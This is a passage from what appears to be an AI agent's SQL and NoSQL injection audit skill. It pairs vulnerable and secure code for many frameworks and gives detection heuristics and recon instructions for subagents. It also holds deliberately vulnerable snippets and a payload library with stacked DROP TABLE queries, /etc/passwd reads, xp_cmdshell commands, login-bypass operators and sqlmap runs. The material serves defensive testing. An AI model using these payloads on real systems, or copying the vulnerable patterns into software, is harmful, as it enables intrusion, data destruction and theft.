
**1. Parameterized queries / prepared statements (most common fix)**
```python
# Python — cursor.execute with tuple binding
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Node.js — mysql2 / pg placeholder binding
db.query("SELECT * FROM users WHERE id = ?", [userId])
pool.query("SELECT * FROM users WHERE id = $1", [userId])

# Java — PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# Go — database/sql placeholder
db.QueryRow("SELECT * FROM users WHERE id = $1", userID)

# PHP — PDO with named params
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);

# C# — SqlCommand with parameters
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", userId);
```

**2. ORM query builder (safe by default)**
```python
# Django ORM
User.objects.filter(id=user_id)

# ActiveRecord (Rails)
User.find(params[:id])
User.where(name: params[:name])

# Prisma (tagged template literal form of $queryRaw)
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`

# Sequelize with replacements
await sequelize.query("SELECT * FROM users WHERE id = ?", { replacements: [userId] })

# Laravel Eloquent (non-raw)
User::find($id)

# Hibernate / JPA
entityManager.createQuery("SELECT u FROM User u WHERE u.id = :id")
    .setParameter("id", userId)
```

**3. Allowlist validation for dynamic identifiers**
```python
# Dynamic ORDER BY — validate column name against a hardcoded set before interpolating
ALLOWED_COLUMNS = {'name', 'created_at', 'price'}
if sort_col not in ALLOWED_COLUMNS:
    raise ValueError("Invalid column")
query = f"SELECT * FROM products ORDER BY {sort_col}"  # safe only after allowlist check
```

***

## Vulnerable vs. Secure Examples

### Python — Django (raw SQL)
[ref: #sqli-ex-django-raw]

```python
# VULNERABLE: f-string interpolation in raw()
def search_users(request):
    username = request.GET.get('username')
    users = User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")
    return JsonResponse(list(users.values()), safe=False)

# SECURE: parameterized raw()
def search_users(request):
    username = request.GET.get('username')
    users = User.objects.raw("SELECT * FROM auth_user WHERE username = %s", [username])
    return JsonResponse(list(users.values()), safe=False)
```

### Python — Flask / SQLAlchemy
[ref: #sqli-ex-flask-sqlalchemy]

```python
# VULNERABLE: f-string into text()
@app.route('/search')
def search():
    name = request.args.get('name')
    result = db.session.execute(text(f"SELECT * FROM products WHERE name = '{name}'"))
    return jsonify(result.fetchall())

# SECURE: named bound parameter
@app.route('/search')
def search():
    name = request.args.get('name')
    result = db.session.execute(
        text("SELECT * FROM products WHERE name = :name"), {"name": name}
    )
    return jsonify(result.fetchall())
```

### Python — FastAPI / SQLAlchemy 2.0 (async)
[ref: #sqli-ex-fastapi-async]

```python
from fastapi import FastAPI, Depends
from sqlalchemy import text, select
from sqlalchemy.ext.asyncio import AsyncSession

app = FastAPI()

# VULNERABLE: f-string into text() inside an async endpoint
@app.get("/users")
async def get_user(name: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))
    return result.all()

# SECURE: bound parameter via text() + execution-time mapping
@app.get("/users")
async def get_user(name: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
    return result.all()

# SECURE: SQLAlchemy 2.0 select() construct (preferred — no raw SQL at all)
@app.get("/users")
async def get_user(name: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(User).where(User.name == name))
    return result.scalars().all()
```

```python
import asyncpg

# VULNERABLE
await conn.fetch(f"SELECT * FROM users WHERE name = '{name}'")

# SECURE: asyncpg uses positional $1, $2, … placeholders
await conn.fetch("SELECT * FROM users WHERE name = $1", name)
```

`aiosqlite` mirrors the stdlib `sqlite3` module and uses `?` positional placeholders.

### Python — sqlite3 / psycopg2
[ref: #sqli-ex-sqlite3-psycopg2]

> **Driver note:** `psycopg` (v3) is the current PostgreSQL driver — same `%s` placeholder style as `psycopg2`, which is now legacy. `psycopg` v3 also supports server-side binding via `ClientCursor` and `AsyncConnection` for async code.

```python
# VULNERABLE
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")
    return cursor.fetchone()

# SECURE
def get_user(username):
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    return cursor.fetchone()
```

### Node.js — mysql2
[ref: #sqli-ex-nodejs-mysql2]

```javascript
// VULNERABLE: template literal in query string
app.get('/user', async (req, res) => {
  const { id } = req.query;
  const [rows] = await db.query(`SELECT * FROM users WHERE id = ${id}`);
  res.json(rows);
});

// SECURE: placeholder binding
app.get('/user', async (req, res) => {
  const { id } = req.query;
  const [rows] = await db.query('SELECT * FROM users WHERE id = ?', [id]);
  res.json(rows);
});
```

### Node.js — pg (PostgreSQL)
[ref: #sqli-ex-nodejs-pg]

```javascript
// VULNERABLE
app.get('/orders', async (req, res) => {
  const status = req.query.status;
  const result = await pool.query(`SELECT * FROM orders WHERE status = '${status}'`);
  res.json(result.rows);
});

// SECURE
app.get('/orders', async (req, res) => {
  const status = req.query.status;
  const result = await pool.query('SELECT * FROM orders WHERE status = $1', [status]);
  res.json(result.rows);
});
```

### Ruby on Rails
[ref: #sqli-ex-rails]

```ruby
# VULNERABLE: string interpolation in where()
def search
  @users = User.where("name = '#{params[:name]}'")
end

# VULNERABLE: find_by_sql with interpolation
def find_user
  @user = User.find_by_sql("SELECT * FROM users WHERE email = '#{params[:email]}'")
end

# SECURE: parameterized where()
def search
  @users = User.where("name = ?", params[:name])
  # or using hash form: User.where(name: params[:name])
end
```

### Java — Spring JDBC
[ref: #sqli-ex-spring-jdbc]

```java
// VULNERABLE: string concatenation
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    return jdbcTemplate.queryForObject(sql, userRowMapper);
}

// SECURE: parameterized query
public User findUser(String username) {
    return jdbcTemplate.queryForObject(
        "SELECT * FROM users WHERE username = ?", userRowMapper, username
    );
}
```

### Java — Hibernate / JPA native query
[ref: #sqli-ex-hibernate-native]

```java
// VULNERABLE: concatenation into native query
public User findUserById(String id) {
    String sql = "SELECT * FROM users WHERE id = " + id;
    return (User) entityManager.createNativeQuery(sql, User.class).getSingleResult();
}

// SECURE: positional parameter
public User findUserById(String id) {
    return (User) entityManager.createNativeQuery(
        "SELECT * FROM users WHERE id = ?1", User.class)
        .setParameter(1, id)
        .getSingleResult();
}
```

### Go — database/sql
[ref: #sqli-ex-go-database-sql]

```go
// VULNERABLE: fmt.Sprintf to build query
func GetUserByName(name string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", name)
    row := db.QueryRow(query)
    // ...
}

// SECURE: parameterized query
func GetUserByName(name string) (*User, error) {
    row := db.QueryRow("SELECT * FROM users WHERE name = $1", name)
    // ...
}
```

### PHP — PDO
[ref: #sqli-ex-php-pdo]

```php
// VULNERABLE: string concatenation
function getUser($id) {
    $stmt = $pdo->query("SELECT * FROM users WHERE id = " . $id);
    return $stmt->fetch();
}

// SECURE: prepared statement
function getUser($id) {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $stmt->execute(['id' => $id]);
    return $stmt->fetch();
}
```

### PHP — Laravel / Eloquent
[ref: #sqli-ex-php-laravel]

```php
// VULNERABLE: DB::raw with interpolation
$users = DB::table('users')
    ->whereRaw("name = '{$request->input('name')}'")
    ->get();

// VULNERABLE: orderByRaw with request value
$users = User::orderByRaw($request->input('sort'))->get();

// SECURE: parameterized whereRaw / orderBy with allowlist
$users = User::whereRaw("name = ?", [$request->input('name')])->get();
$sort = in_array($request->input('sort'), ['name','created_at']) ? $request->input('sort') : 'name';
$users = User::orderBy($sort)->get();
```

### C# — ADO.NET
[ref: #sqli-ex-csharp-adonet]

```csharp
// VULNERABLE: string concatenation
public User GetUser(string username) {
    using var cmd = new SqlCommand(
        "SELECT * FROM Users WHERE Username = '" + username + "'", conn);
    return ReadUser(cmd.ExecuteReader());
}

// SECURE: parameterized command
public User GetUser(string username) {
    using var cmd = new SqlCommand(
        "SELECT * FROM Users WHERE Username = @username", conn);
    cmd.Parameters.AddWithValue("@username", username);
    return ReadUser(cmd.ExecuteReader());
}
```

### C# — Entity Framework
[ref: #sqli-ex-csharp-ef]

```csharp
// VULNERABLE: FromSqlRaw with interpolation
var users = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'").ToList();

// SECURE: FromSqlRaw with parameter + SqlParameter
var users = context.Users.FromSqlRaw("SELECT * FROM Users WHERE Name = {0}", name).ToList();

// VULNERABLE: ExecuteSqlRaw with concatenation
context.Database.ExecuteSqlRaw("UPDATE Users SET Role = '" + role + "' WHERE Id = " + id);

// SECURE: ExecuteSqlRaw with parameter
context.Database.ExecuteSqlRaw("UPDATE Users SET Role = @role WHERE Id = @id",
    new SqlParameter("@role", role), new SqlParameter("@id", id));
```

### ORM kwargs key injection (Django `filter(**kwargs)`, Prisma `orderBy`)
[ref: #sqli-ex-orm-kwargs-injection]

Dictionary/object expansion into ORM methods lets attackers inject internal control **keys** — not values — that alter query logic. CVE-2025-64459 (Django, patched November 2025): user-controlled keys passed via `**kwargs` into `filter()`/`exclude()`/`get()`/`Q()` could set undocumented internal arguments `_connector` (flips AND/OR) or `_negated` (toggles negation), enabling data exfiltration and authentication bypass.

```python
# VULNERABLE: user-controlled dict expanded into the ORM
def search(request):
    filters = request.GET.dict()          # attacker adds _connector=OR&_negated=True
    return User.objects.filter(**filters)

# SECURE: allowlist keys and map them explicitly
ALLOWED = {"name", "email", "status"}
def search(request):
    filters = {k: v for k, v in request.GET.dict().items() if k in ALLOWED}
    return User.objects.filter(**filters)
```

```javascript
// VULNERABLE: raw unsafe methods and unvalidated dynamic objects
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`);
await prisma.user.findMany({ orderBy: { [req.query.sort]: "asc" } }); // attacker sorts by hidden fields

// SECURE: parameterized raw tag and an orderBy allowlist
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`;
const SORTABLE = new Set(["name", "createdAt"]);
const sort = SORTABLE.has(req.query.sort) ? req.query.sort : "createdAt";
await prisma.user.findMany({ orderBy: { [sort]: "asc" } });
```

Detection signal: any `filter(**user_dict)`, `Q(**user_dict)`, `$queryRawUnsafe`/`$executeRawUnsafe`, or dynamic `orderBy`/`where` object built from request data without a key allowlist.

### Dynamic ORDER BY / Column Names (all stacks)
[ref: #sqli-ex-dynamic-order-by]

```python
# VULNERABLE: unsanitized user input as column name (parameterization can't help here)
sort_col = request.args.get('sort', 'name')
cursor.execute(f"SELECT * FROM products ORDER BY {sort_col}")

# SECURE: allowlist validation before interpolation
ALLOWED_SORT_COLS = {'name', 'price', 'created_at'}
sort_col = request.args.get('sort', 'name')
if sort_col not in ALLOWED_SORT_COLS:
    return abort(400)
cursor.execute(f"SELECT * FROM products ORDER BY {sort_col}")
```

### GraphQL resolver SQLi (Node.js / pg)
[ref: #sqli-ex-graphql-nodejs]

```javascript
// VULNERABLE: resolver argument interpolated into raw SQL
const resolvers = {
  Query: {
    user: async (_, args) => {
      const result = await pool.query(`SELECT * FROM users WHERE id = ${args.id}`);
      return result.rows[0];
    }
  }
};

// SECURE: parameterized query in resolver
const resolvers = {
  Query: {
    user: async (_, args) => {
      const result = await pool.query('SELECT * FROM users WHERE id = $1', [args.id]);
      return result.rows[0];
    }
  }
};
```

### GraphQL resolver SQLi (Python / Graphene + SQLAlchemy)
[ref: #sqli-ex-graphql-python]

```python
# VULNERABLE
class Query(graphene.ObjectType):
    user = graphene.Field(UserType, id=graphene.String())

    def resolve_user(self, info, id):
        result = db.session.execute(text(f"SELECT * FROM users WHERE id = '{id}'"))
        return result.fetchone()

# SECURE
class Query(graphene.ObjectType):
    user = graphene.Field(UserType, id=graphene.Int())

    def resolve_user(self, info, id):
        result = db.session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": id})
        return result.fetchone()
```

### GraphQL resolver SQLi (Java / graphql-java + JDBC)
[ref: #sqli-ex-graphql-java]

```java
// VULNERABLE
DataFetcher<User> userFetcher = env -> {
    String id = env.getArgument("id");
    String sql = "SELECT * FROM users WHERE id = '" + id + "'";
    return jdbcTemplate.queryForObject(sql, userRowMapper);
};

// SECURE
DataFetcher<User> userFetcher = env -> {
    Long id = env.getArgument("id");   // GraphQL scalar coercion
    return jdbcTemplate.queryForObject(
        "SELECT * FROM users WHERE id = ?", userRowMapper, id);
};
```

### Stored procedure SQLi (PL/SQL example)
[ref: #sqli-ex-stored-proc-plsql]

```sql
-- VULNERABLE: dynamic SQL built inside the procedure
CREATE PROCEDURE get_user(p_id IN VARCHAR2) AS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE id = ' || p_id;
END;

-- SECURE: bind variable inside dynamic SQL
CREATE PROCEDURE get_user(p_id IN VARCHAR2) AS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE id = :id' USING p_id;
END;
```

### Stored procedure SQLi (T-SQL example)
[ref: #sqli-ex-stored-proc-tsql]

```sql
-- VULNERABLE
CREATE PROCEDURE sp_GetUser @name NVARCHAR(50)
AS
BEGIN
  DECLARE @sql NVARCHAR(MAX) = N'SELECT * FROM users WHERE name = ''' + @name + '''';
  EXEC sp_executesql @sql;
END

-- SECURE
CREATE PROCEDURE sp_GetUser @name NVARCHAR(50)
AS
BEGIN
  EXEC sp_executesql N'SELECT * FROM users WHERE name = @name', N'@name NVARCHAR(50)', @name;
END
```

### Stored procedure SQLi (MySQL example)
[ref: #sqli-ex-stored-proc-mysql]

```sql
-- VULNERABLE
CREATE PROCEDURE GetUser(IN p_email VARCHAR(255))
BEGIN
  SET @sql = CONCAT('SELECT * FROM users WHERE email = ''', p_email, '''');
  PREPARE stmt FROM @sql;
  EXECUTE stmt;
  DEALLOCATE PREPARE stmt;
END

-- SECURE
CREATE PROCEDURE GetUser(IN p_email VARCHAR(255))
BEGIN
  SET @email = p_email;
  PREPARE stmt FROM 'SELECT * FROM users WHERE email = ?';
  EXECUTE stmt USING @email;
  DEALLOCATE PREPARE stmt;
END
```

### Batch / stacked query injection (Node.js / pg)
[ref: #sqli-ex-stacked-queries]

```javascript
// VULNERABLE: raw string allows stacked statements when multi-statement mode is enabled
app.post('/update', async (req, res) => {
  const { note } = req.body;
  await pool.query(`UPDATE notes SET body = '${note}' WHERE id = 1`);
  res.sendStatus(200);
});

// Attacker payload in note:
//   '; DROP TABLE notes; --

// SECURE: parameterized update prevents statement stacking
app.post('/update', async (req, res) => {
  const { note } = req.body;
  await pool.query('UPDATE notes SET body = $1 WHERE id = $2', [note, 1]);
  res.sendStatus(200);
});
```

### Second-order SQLi (Python / Django)
[ref: #sqli-ex-second-order]

```python
# VULNERABLE: user-supplied display_name is stored safely, then used unsafely later
def save_profile(request):
    profile = UserProfile.objects.get(user=request.user)
    profile.display_name = request.POST.get('display_name')   # stored with parameterization
    profile.save()

def admin_report(request):
    for profile in UserProfile.objects.all():
        # VULNERABLE: stored value concatenated into a raw report query
        cursor.execute(f"SELECT * FROM activity WHERE actor_name = '{profile.display_name}'")
```

### NoSQL injection — MongoDB (Node.js / Mongoose)
[ref: #sqli-ex-nosql-mongodb]

```javascript
// VULNERABLE: req.body.username can be an object like { "$ne": null }
app.post('/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username, password: req.body.password });
  res.json(user);
});

// SECURE: cast to string, validate schema, or use an allowlist
app.post('/login', async (req, res) => {
  const username = String(req.body.username);
  const password = String(req.body.password);
  const user = await User.findOne({ username, password });
  res.json(user);
});
```

### NoSQL injection — DynamoDB (Python / boto3)
[ref: #sqli-ex-nosql-dynamodb]

```python
# VULNERABLE: user input concatenated into KeyConditionExpression
user_id = event['pathParameters']['id']
response = table.query(
    KeyConditionExpression=f"user_id = {user_id}"
)

# SECURE: use expression attribute values
response = table.query(
    KeyConditionExpression="user_id = :uid",
    ExpressionAttributeValues={":uid": user_id}
)
```

### NoSQL injection — Elasticsearch (Python)
[ref: #sqli-ex-nosql-elasticsearch]

```python
# VULNERABLE: user input concatenated into query DSL
q = '{"query": {"match": {"name": "%s"}}}' % request.args.get('name')
res = es.search(index="products", body=q)

# SECURE: build DSL as a structure, not a string
res = es.search(index="products", body={
    "query": {"match": {"name": request.args.get('name')}}
})
```

***

### NoSQL injection — Neo4j Cypher / Cassandra CQL / Redis Lua / ClickHouse
[ref: #sqli-ex-nosql-wide]

```python
# Neo4j — VULNERABLE: input concatenated into Cypher
query = "MATCH (n:User {username: '" + user_input + "'}) RETURN n"
graph.run(query)

# Neo4j — SECURE: parameters treat input as data
query = "MATCH (n:User {username: $username}) RETURN n"
graph.run(query, username=user_input)
```

```python
# Cassandra — VULNERABLE: input concatenated into CQL
cql = "SELECT * FROM users WHERE username = '" + user_input + "';"
session.execute(cql)

# Cassandra — SECURE: prepared statement with placeholder
query = "SELECT * FROM users WHERE username = ?;"
session.execute(query, [user_input])
```

```python
# Redis — VULNERABLE: input concatenated into an EVAL script body
script = "return redis.call('GET', '" + user_input + "')"
redis_client.eval(script, 0)

# Redis — SECURE: dynamic values passed via KEYS/ARGV, never interpolated
script = "return redis.call('GET', KEYS[1])"
redis_client.eval(script, 1, user_input)
```

```python
# ClickHouse — VULNERABLE: user-controlled column/expression interpolation (identifiers cannot be parameterized)
query = "SELECT " + user_supplied_column + " FROM events ORDER BY timestamp"
client.execute(query)

# ClickHouse — SECURE: allowlist identifiers before interpolating
allowed_columns = ["id", "timestamp", "event_name"]
if user_supplied_column in allowed_columns:
    query = f"SELECT {user_supplied_column} FROM events ORDER BY timestamp"
    client.execute(query)
```

## SQLi Variant Taxonomy
[ref: #sqli-variant-taxonomy]

In addition to classic relational SQLi, subagents should flag these API-relevant variants when the architecture indicates the corresponding technology is in use.

| Variant | Attack example | Detection signal |
| --- | --- | --- |
| Classic relational SQLi | `' OR '1'='1' --` | String concatenation / interpolation into `execute`, `query`, `prepare`. |
| ORM raw/unsafe injection | `User.objects.raw(f"...")`, `$queryRawUnsafe(input)` | Raw/unsafe ORM methods called with a non-static string. |
| MongoDB NoSQLi | `{ "username": { "$ne": null }, "password": { "$ne": null } }` | User input passed directly into `find`, `findOne`, or aggregation pipelines without schema validation. |
| DynamoDB injection | `KeyConditionExpression` built with string concatenation | Raw string expressions containing user input in boto3/DynamoDB SDK calls. |
| DynamoDB filter injection | `FilterExpression` with unsanitized placeholders | Missing `ExpressionAttributeValues` / `ExpressionAttributeNames`. |
| Elasticsearch/Lucene injection | `q=username:* AND password:*` | User input concatenated into query DSL strings. |
| GraphQL resolver SQLi | Resolver args interpolated into raw SQL | `pool.query(`SELECT * FROM users WHERE id = ${args.id}`)`. |
| Second-order SQLi | Stored user value later used in a report/batch query | User-provided values saved to the DB and later read into dynamic SQL by batch jobs, admin tools, or import pipelines. |
| Stored-procedure SQLi | `EXECUTE IMMEDIATE 'SELECT ... ' \|\| user_id` | Dynamic SQL inside stored procedures, functions, or packages. |
| Batch / stacked query | `'; DROP TABLE users; --` | Raw strings passed to `execute()` without prepared-statement mode; drivers that allow multiple statements. |
| Boolean-based blind | `' AND 1=1 --` vs `' AND 1=2 --` | Same error page returns different content/length/status for true and false conditions. |
| Time-based blind | `' OR SLEEP(5)--` | Injectable parameter used in a query where a time-delay payload causes a measurable response delay. |
| Out-of-band (OOB) | DNS/HTTP exfiltration payloads | Database functions such as `LOAD_FILE`, `UTL_HTTP`, `xp_dirtree` reachable from injectable parameter. |

### Detection heuristics per variant
[ref: #sqli-detection-heuristics]

**Classic relational SQLi**
- Look for SQL keywords (`SELECT`, `INSERT`, `UPDATE`, `DELETE`, `WHERE`, `ORDER BY`) in string literals that are built with `+`, `.format`, f-strings, template literals, `sprintf`, `String.format`, or interpolation.
- Confirm the string reaches a query execution method.

**ORM raw/unsafe injection**
- Identify raw methods and verify whether the query string is static. Tagged template literals (`prisma.$queryRaw\`...\``) with inline `${}` are safe because the driver binds them; any other form is suspect.
- `.literal()`, `.where("col = '"+var+"'")`, `.from_sql`, `.raw`, `.unsafe` are high-signal patterns.

**MongoDB NoSQLi**
- `findOne({ username: req.body.username })` where `req.body.username` can be an object.
- `$where`, `$expr`, `$regex`, `$ne`, `$gt`, `$in` operators built from request data.
- Aggregation pipelines with `$match` stages driven by user input.

**DynamoDB**
- `KeyConditionExpression` or `FilterExpression` containing `f"..."` or `+` in Python, template literals in JS.
- Missing `ExpressionAttributeValues` or use of placeholders without values.

**Elasticsearch / Lucene**
- String building for `body=` or `q=` parameters.
- Use of raw JSON strings for DSL instead of language-native structures.

**GraphQL resolver SQLi**
- Any resolver that builds SQL using `args.*` or `ctx.req.*` values.
- Look for `pool.query`, `session.execute`, `jdbcTemplate`, `entityManager` inside resolver functions.

**Second-order SQLi**
- Values read from the database (e.g., `profile.display_name`, `imported_record.reference`) are later interpolated into SQL.
- Batch/report/admin endpoints that query stored user content.

**Stored-procedure SQLi**
- `EXECUTE IMMEDIATE`, `sp_executesql`, `EXEC(...)`, `PREPARE/EXECUTE`, `OPEN cursor FOR ...` inside procedure/function definitions.
- Application code calling a procedure with a dynamic argument is not itself SQLi unless the procedure concatenates internally; both layers must be checked.

**Batch / stacked queries**
- Drivers that enable `multiStatements` (mysql2), `allowMultiQueries` (Connector/J), or default multi-statement support in some DB-API drivers.
- Code that passes a fully concatenated string to `execute()` rather than a prepared statement.

**Blind SQLi**
- Error suppression or generic error handling that hides database errors.
- Endpoints whose response content depends on the truth of a SQL predicate.
- Time-delay detectability: network baseline must be established; compare response times for `SLEEP(0)` vs `SLEEP(5)`.

***

## ORM Unsafe-Pattern Cheat Sheet
[ref: #sqli-orm-cheat-sheet]

| Stack | Unsafe pattern | Safer alternative |
| --- | --- | --- |
| Python/Django | `User.objects.raw(f"SELECT * FROM app_user WHERE id = {uid}")` | `User.objects.raw("SELECT * FROM app_user WHERE id = %s", [uid])` |
| Python/Django | `User.objects.extra(where=[f"name = '{name}'"])` (`.extra()` deprecated since Django 1.9 — use `annotate()`/`Func` expressions instead) | `User.objects.filter(name=name)` or `extra(where=["name = %s"], params=[name])` |
| Python/SQLAlchemy | `session.execute(text(f"SELECT * FROM users WHERE id = {uid}"))` | `session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": uid})` |
| Java/Hibernate | `createNativeQuery("SELECT * FROM users WHERE id = " + id)` | `createNativeQuery("SELECT * FROM users WHERE id = ?1").setParameter(1, id)` |
| Java/Hibernate | `createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")` | `createQuery("SELECT u FROM User u WHERE u.name = :name").setParameter("name", name)` |
| Node.js/Sequelize | `sequelize.query(\`SELECT * FROM users WHERE id = ${id}\`)` | `sequelize.query("SELECT * FROM users WHERE id = ?", { replacements: [id] })` |
| Node.js/Sequelize | `where(literal(\`col = '${val}'\`))` | `where({ col: val })` |
| Node.js/TypeORM | `createQueryBuilder().where(\`col = '${val}'\`)` | `createQueryBuilder().where("col = :val", { val })` |
| Node.js/Prisma | `prisma.$queryRawUnsafe(\`...${val}...\`)` | `prisma.$queryRaw\`... ${val} ...\`` |
| Ruby on Rails | `User.find_by_sql("SELECT * FROM users WHERE id = #{params[:id]}")` | `User.find_by_sql(["SELECT * FROM users WHERE id = ?", params[:id]])` |
| Ruby on Rails | `User.where("name = '#{params[:name]}'")` | `User.where("name = ?", params[:name])` or `User.where(name: params[:name])` |
| Go/database/sql | `db.Query("SELECT * FROM users WHERE id = " + id)` | `db.Query("SELECT * FROM users WHERE id = ?", id)` |
| PHP/Laravel | `DB::raw("... {$input} ...")` | `DB::raw("... ? ...", [$input])` or query builder |
| C# / EF Core | `FromSqlRaw($"SELECT ... {name}")` | `FromSqlRaw("SELECT ... {0}", name)` or `FromSqlInterpolated($"... {name}")` |

***

## Dynamic-Test Payload Library
[ref: #sqli-payload-library]

Subagents should include these probes in dynamic-test templates. Always pair manual tests with a sqlmap run when the endpoint is reachable and legal to test.

### MySQL / MariaDB
[ref: #sqli-payloads-mysql]

```sql
-- Error / union-based
' UNION SELECT null,version(),user() -- -

-- Boolean blind
' AND 1=1 -- -   (true branch)
' AND 1=2 -- -   (false branch)

-- Time-based blind
' OR SLEEP(5) -- -
' OR (SELECT SLEEP(5) FROM DUAL) -- -

-- Stacked query
'; DROP TABLE users; -- -
'; INSERT INTO logs VALUES ('pwned'); -- -
```

```bash
sqlmap -u "https://app.example.com/api/search?q=test" -p q --batch --dbs
```

### PostgreSQL
[ref: #sqli-payloads-postgresql]

```sql
-- Error / union-based
' UNION SELECT version(), current_user -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; SELECT pg_sleep(5) -- -
' OR pg_sleep(5) -- -

-- Stacked query
'; DROP TABLE users; -- -
'; SELECT pg_read_file('/etc/passwd') -- -
```

```bash
sqlmap -u "https://app.example.com/api/orders?status=test" -p status --dbms=postgresql --batch --tables
```

### Microsoft SQL Server
[ref: #sqli-payloads-mssql]

```sql
-- Error / union-based
' UNION SELECT @@version, db_name() -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; WAITFOR DELAY '0:0:5' -- -
' OR WAITFOR DELAY '0:0:5' -- -

-- Stacked query
'; DROP TABLE users; -- -
'; EXEC xp_cmdshell 'whoami'; -- -
```

```bash
sqlmap -u "https://app.example.com/api/report?id=1" -p id --dbms=mssql --batch --os-cmd=whoami
```

### Oracle
[ref: #sqli-payloads-oracle]

```sql
-- Error / union-based
' UNION SELECT banner, null FROM v$version -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind
'; BEGIN DBMS_LOCK.SLEEP(5); END; -- -
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5) -- -

-- Stacked query (limited; depends on driver)
'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END; -- -
```

```bash
sqlmap -u "https://app.example.com/api/users?name=test" -p name --dbms=oracle --batch --dbs
```

### SQLite
[ref: #sqli-payloads-sqlite]

```sql
-- Error / union-based
' UNION SELECT sqlite_version(), null -- -

-- Boolean blind
' AND 1=1 -- -
' AND 1=2 -- -

-- Time-based blind (CPU-bound; use carefully)
' AND randomblob(1000000000) -- -

-- Stacked query (SQLite does not support stacked statements)
```

### NoSQL injection probes
[ref: #sqli-payloads-nosql]

```json
// MongoDB operator injection
{
  "username": { "$ne": null },
  "password": { "$ne": null }
}

// MongoDB $where injection
{
  "$where": "this.password.length > 0"
}

// DynamoDB injection via KeyConditionExpression
{
  "KeyConditionExpression": "user_id = 1 OR user_id = 1"
}
```

### GraphQL resolver probe
[ref: #sqli-payloads-graphql]

```graphql
query {
  user(id: "1' OR '1'='1") {
    id
    name
  }
}
```

***

## Execution
[ref: #sqli-execution-intro]

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Recon — Find Vulnerable SQL Construction Sites
[ref: #sqli-phase1-recon]

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where a SQL query is constructed in a vulnerable way — using string concatenation, interpolation, or formatting with any variable (regardless of where that variable comes from). Write results to `{{ REPORTS_ROOT }}/02_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, database layer, ORM patterns, and query execution methods.
>
> **What to search for — vulnerable query construction patterns**:
>
> Look for SQL query execution calls where the query string argument is built dynamically rather than being a static string with placeholder parameters. Flag ANY dynamic variable embedded into the query — you are not yet tracing whether the variable is user-controlled; that is Phase 2's job.
>
> 1. **String concatenation into a SQL execution call**:
>    - `cursor.execute("SELECT ... WHERE id = " + var)`
>    - `$pdo->query("SELECT * FROM users WHERE id = " . $var)`
>    - `jdbcTemplate.query("SELECT * WHERE username = '" + var + "'")`
>
> 2. **F-strings / template literals used as a query argument**:
>    - `cursor.execute(f"SELECT * WHERE name = '{var}'")`
>    - `` db.query(`SELECT * WHERE id = ${var}`) ``
>    - `db.QueryRow(fmt.Sprintf("SELECT * WHERE id = '%s'", var))`
>
> 3. **String formatting functions used to build the query**:
>    - `cursor.execute("SELECT * WHERE id = %s" % var)` (note: `%` formatting, NOT parameterized binding)
>    - `cursor.execute("SELECT * WHERE id = {}".format(var))`
>    - `String.format("SELECT * WHERE id = '%s'", var)` (Java)
>    - `sprintf("SELECT * WHERE id = %s", $var)` (PHP)
>
> 4. **ORM raw/unsafe methods called with a dynamically built string** (not a static template with bound params):
>    - Django: `Model.objects.raw(f"...")`, `RawSQL(f"...")`, `extra(where=[f"..."])`
>    - ActiveRecord: `where("col = '#{var}'")`  (Ruby interpolation inside string arg)
>    - Sequelize: `` sequelize.query(`...${var}...`) ``, `literal(var)`
>    - TypeORM: `` createQueryBuilder().where(`col = '${var}'`) ``, `.query("..." + var)`
>    - Prisma: `$queryRawUnsafe(...)`, `$executeRawUnsafe(...)`
>    - Entity Framework: `FromSqlRaw("..." + var)`, `ExecuteSqlRaw("..." + var)`
>    - Hibernate: `createNativeQuery("..." + var)`, `createQuery("..." + var)`
>    - Laravel: `DB::raw("..." . $var)`, `whereRaw("..." . $var)`, `orderByRaw($var)`
>
> 5. **Dynamic identifiers** — any variable used as a column name, table name, `ORDER BY` / `GROUP BY` value in a query string (parameterization cannot protect identifiers; only allowlist validation can):
>    - `f"SELECT * FROM {table_var}"`
>    - `` `SELECT * FROM ${tableVar}` ``
>    - `f"SELECT * ORDER BY {sort_col}"`
>
> 6. **NoSQL query construction from raw user data or string expressions**:
>    - MongoDB: `findOne({ username: req.body.username })` where the body can be an object
>    - DynamoDB: `KeyConditionExpression` / `FilterExpression` built with string interpolation
>    - Elasticsearch: query DSL built by string formatting
>
> 7. **Stored-procedure dynamic SQL**:
>    - `EXECUTE IMMEDIATE '...' || var`
>    - `sp_executesql @sql` where `@sql` is concatenated
